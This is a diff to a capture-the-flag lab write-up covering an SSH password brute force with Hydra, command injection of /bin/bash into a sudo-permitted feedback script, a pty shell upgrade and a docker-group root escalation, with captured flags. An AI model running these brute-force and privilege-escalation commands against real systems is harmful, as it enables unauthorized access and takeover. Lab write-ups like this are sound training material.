@@ -60,9 +60,35 @@ ftp 192.168.56.101
 ### File Analysis
 - ```cat``` was used to display information in both files
 - information.txt
-  - wewewe
+  - A text file greeting the user "Robin" and informing them of their password "weekness" and their request
+  to choose a password from p_lists.txt
 - p_lists.txt
-  - 
+  - A text file with numerous passwords
+
+### SSH Bruteforce
+- Knowing the username "Robin" Hydra was used to obtain the password through bruteforcing through the p_lists.txt
+```hydra -l robin -P p_lists.txt ssh://192.168.56.101```
+- The resulting password was successfully found: k4rv3ndh4nh4ck3r
+
+## 4. Escalating Privileges: From Robin to Jerry
+- An SSH connection was made with ```ssh robin@192.168.56.105``` where a login was made with the password obtained above for 'robin'
+- ```ls``` revealed a text file "user1.txt" with the contents:
+  - ```Fl4g{u5er1r34ch3d5ucc355fully}```
+- Checking for the users privileges with the command ```sudo -l``` revealed that robin can run the script /home/robin/project/feedback.sh as the user jerry without a password
+- Running the command ```sudo -u jerry /home/robin/project/feedback.sh``` allowed us to enter a name (I entered johndoe) along with
+a ```/bin/bash``` injection into subsequent prompt asking for 'feedback about this target machine'
+- ```whoami``` was used to confirm the user was ```jerry```
+- Lastly, to upgrade the shell ```python3 -c 'import pty; pty.spawn("/bin/bash")'``` was used
+
+### Jerry To Root
+- ```cd``` was used to change the directory from robin > home > jerry along with ```ls``` to view available files/directories where a user2.txt file was found and read with ```cat```
+  - The contents displayed the flag: Fl4g{Y0ur34ch3du53r25uc355ful1y} along with text prompting the finder (me) to try to find the root
+- Next the ``id`` command was used that revealed that ```jerry``` was a member of the ```docker``` group with the id 114
+- To exploit docker and escalate privileges further the command ```docker run -v /:/mnt --rm -it alpine chroot /mnt sh``` was used which allowed us root shell on the host machine
+- Finally, we changed the directory to root with ```cd /root``` and used ``ls`` to view files/directories that revealed the a ```root.txt``` file
+- Running ```cat root.txt``` revealed the final flag:
+  - Fl4g{r00t-H4ckTh3P14n3t0nc34g41n}
+
 
 
 
